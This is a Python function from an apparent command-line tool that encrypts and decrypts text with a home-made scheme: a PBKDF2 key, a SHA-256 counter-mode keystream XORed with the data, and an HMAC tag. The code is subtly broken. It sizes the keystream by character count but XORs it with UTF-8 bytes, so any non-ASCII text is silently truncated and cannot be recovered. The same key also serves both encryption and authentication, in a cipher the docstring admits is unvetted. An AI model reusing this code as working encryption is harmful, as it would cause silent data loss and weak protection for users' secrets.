def cmd_encrypt(ctx):
    """Authenticated symmetric encryption using only the standard library.

    Scheme: PBKDF2-HMAC-SHA256 key -> SHA-256 keystream (counter mode) -> XOR,
    with an HMAC-SHA256 tag over salt+nonce+ciphertext. This is a real,
    reversible cipher suitable for obfuscating secrets, with the caveat that
    it is not a vetted standard like AES - the generated README says so.
    """
    action = ctx["choose"]("Action", ["Encrypt text", "Decrypt token"]) or "Encrypt text"
    iterations = 200_000

    def _keystream(key: bytes, nonce: bytes, length: int) -> bytes:
        out = bytearray()
        i = 0
        while len(out) < length:
            out += hashlib.sha256(key + nonce + i.to_bytes(8, "big")).digest()
            i += 1
        return bytes(out[:length])

    if action == "Encrypt text":
        password = getpass.getpass("Passphrase: ")
        plaintext = ctx["ask"]("Plaintext")
        if plaintext is None:
            return
        salt = secrets.token_bytes(16)
        nonce = secrets.token_bytes(16)
        key = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iterations, dklen=32)
        ct = bytes(b ^ k for b, k in zip(plaintext.encode("utf-8"), _keystream(key, nonce, len(plaintext))))
        tag = hmac.new(key, salt + nonce + ct, "sha256").digest()
        payload = base64.b64encode(salt + nonce + tag + ct).decode("ascii")
        ctx["console"].print(f"[{ctx['theme'].primary}]Token[/]: {payload}")
    else:
        password = getpass.getpass("Passphrase: ")
        token_b64 = ctx["ask"]("Token")
        try:
            raw = base64.b64decode(token_b64)
            salt, nonce, tag, ct = raw[:16], raw[16:32], raw[32:64], raw[64:]
            key = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iterations, dklen=32)
            expected = hmac.new(key, salt + nonce + ct, "sha256").digest()
            if not hmac.compare_digest(tag, expected):
                raise ValueError("Authentication failed (bad passphrase or tampered token)")
            ks = _keystream(key, nonce, len(ct))
            plaintext = bytes(b ^ k for b, k in zip(ct, ks)).decode("utf-8", errors="replace")
            ctx["console"].print(f"[{ctx['theme'].success}]Decrypted:[/] {plaintext}")
        except (ValueError, binascii.Error) as exc:
            ctx["console"].print(f"[{ctx['theme'].danger}]Decryption failed: {exc}[/]")


